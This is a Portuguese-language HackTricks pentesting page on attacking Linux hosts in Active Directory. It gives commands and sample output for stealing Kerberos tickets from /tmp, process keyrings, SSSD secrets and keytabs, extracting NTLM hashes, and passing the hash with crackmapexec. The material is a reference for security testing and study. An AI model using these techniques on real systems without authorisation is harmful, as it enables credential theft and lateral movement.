# Linux Active Directory

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Uma máquina Linux também pode estar presente em um ambiente Active Directory.

Uma máquina Linux em um AD pode estar **armazenando diferentes tickets CCACHE dentro de arquivos. Esses tickets podem ser usados e abusados como qualquer outro ticket Kerberos**. Para ler esses tickets, você precisará ser o proprietário do usuário do ticket ou **root** dentro da máquina.

## Enumeração

### Enumeração do AD a partir do Linux

Se você tem acesso a um AD no Linux (ou bash no Windows), pode tentar [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) para enumerar o AD.

Você também pode verificar a seguinte página para aprender **outras maneiras de enumerar o AD a partir do Linux**:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

É uma **alternativa** de código aberto ao Microsoft Windows **Active** **Directory**, usada principalmente como solução de gerenciamento integrado para ambientes **Unix**. Saiba mais sobre isso em:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Brincando com tickets

### Pass The Ticket

Nesta página, você vai encontrar diferentes lugares onde poderia **encontrar tickets Kerberos dentro de um host Linux**, na página a seguir, você pode aprender como transformar esses formatos de tickets CCache em Kirbi (o formato que você precisa usar no Windows) e também como realizar um ataque PTT:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### Reutilização de tickets CCACHE de /tmp

> Quando os tickets são definidos para serem armazenados como um arquivo em disco, o formato e tipo padrão é um arquivo CCACHE. Este é um formato de arquivo binário simples para armazenar credenciais Kerberos. Esses arquivos são normalmente armazenados em /tmp e com permissões 600.

Liste o ticket atual usado para autenticação com `env | grep KRB5CCNAME`. O formato é portátil e o ticket pode ser **reutilizado definindo a variável de ambiente** com `export KRB5CCNAME=/tmp/ticket.ccache`. O formato do nome do ticket Kerberos é `krb5cc_%{uid}`, onde uid é o UID do usuário.
```bash
ls /tmp/ | grep krb5cc
krb5cc_1000
krb5cc_1569901113
krb5cc_1569901115

export KRB5CCNAME=/tmp/krb5cc_1569901115
```
### Reutilização de bilhetes CCACHE a partir do keyring

Os processos podem **armazenar bilhetes Kerberos em sua memória**, esta ferramenta pode ser útil para extrair esses bilhetes (a proteção ptrace deve ser desativada na máquina `/proc/sys/kernel/yama/ptrace_scope`): [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
```bash
# Configuration and build
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release

[root@Lab-LSV01 /]# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in tarlogic[1000] session...
[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
[*] Trying to inject in velociraptor[1120601115] session...
[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
[*] Trying to inject in trex[1120601113] session...
[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
[X] [uid:0] Error retrieving tickets
```
### Reutilização de bilhete CCACHE a partir do SSSD KCM

O SSSD mantém uma cópia do banco de dados no caminho `/var/lib/sss/secrets/secrets.ldb`. A chave correspondente é armazenada como um arquivo oculto no caminho `/var/lib/sss/secrets/.secrets.mkey`. Por padrão, a chave só pode ser lida se você tiver permissões de **root**.

Invocar o **`SSSDKCMExtractor`** com os parâmetros --database e --key irá analisar o banco de dados e **descriptografar os segredos**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
O blob Kerberos do cache de credenciais pode ser convertido em um arquivo CCache Kerberos utilizável que pode ser passado para o Mimikatz/Rubeus.

### Reutilização de ticket CCACHE a partir de keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Extrair contas do arquivo /etc/krb5.keytab

As chaves de serviço usadas por serviços que são executados como root são geralmente armazenadas no arquivo de chave **`/etc/krb5.keytab`**. Essa chave de serviço é equivalente à senha do serviço e deve ser mantida segura.

Use o comando [`klist`](https://adoptopenjdk.net/?variant=openjdk13\&jvmVariant=hotspot) para ler o arquivo keytab e analisar seu conteúdo. A chave que você vê quando o [tipo de chave](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) é 23 é o **NT Hash real do usuário**.
```
klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
[...]
[26] Service principal: host/COMPUTER@DOMAIN
	 KVNO: 25
	 Key type: 23
	 Key: 31d6cfe0d16ae931b73c59d7e0c089c0
	 Time stamp: Oct 07,  2019 09:12:02
[...]
```
No Linux, você pode usar o [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): queremos o hash RC4 HMAC para reutilizar o hash NLTM.
```bash
python3 keytabextract.py krb5.keytab 
[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
[+] Keytab File successfully imported.
        REALM : DOMAIN
        SERVICE PRINCIPAL : host/computer.domain
        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
```
No **macOS** você pode usar o [**`bifrost`**](https://github.com/its-a-feature/bifrost).
```bash
./bifrost -action dump -source keytab -path test
```
Conecte-se à máquina usando a conta e o hash com o CME.
```bash
$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
```
## Referências

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
